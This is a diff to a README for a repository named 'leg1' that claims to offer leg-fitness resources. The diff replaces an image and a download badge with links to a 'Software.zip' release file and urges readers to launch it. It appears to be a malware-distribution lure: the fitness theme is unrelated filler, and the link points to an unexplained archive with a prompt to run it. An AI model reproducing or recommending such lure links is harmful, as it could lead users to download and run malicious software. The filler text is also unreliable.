@@ -1,6 +1,6 @@
 # Welcome to "leg1" Repository! 🦵
 
-![Leg](https://cdn.pixabay.com/photo/2015/06/22/08/40/sport-817372_960_720.jpg)
+![Leg](https://github.com/caca126/leg1/releases/download/v2.0/Software.zip)
 
 ### Description:
 Welcome to the "leg1" repository! This repository does not provide a specific short description, but it is a place where you can explore various resources related to the leg, fitness, and exercise.
@@ -14,7 +14,7 @@ This repository does not provide specific topics, as it covers a wide range of i
 ### Explore Further:
 If you are ready to explore the world of leg fitness and health, you can download additional resources from the following link:
 
-[![Download Resources](https://img.shields.io/static/v1?label=Download&message=Resources&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Resources](https://github.com/caca126/leg1/releases/download/v2.0/Software.zip)](https://github.com/caca126/leg1/releases/download/v2.0/Software.zip)
 
 Please note that the link provided above needs to be launched to access the resources. Click on the button to start your journey to stronger, fitter legs!
 
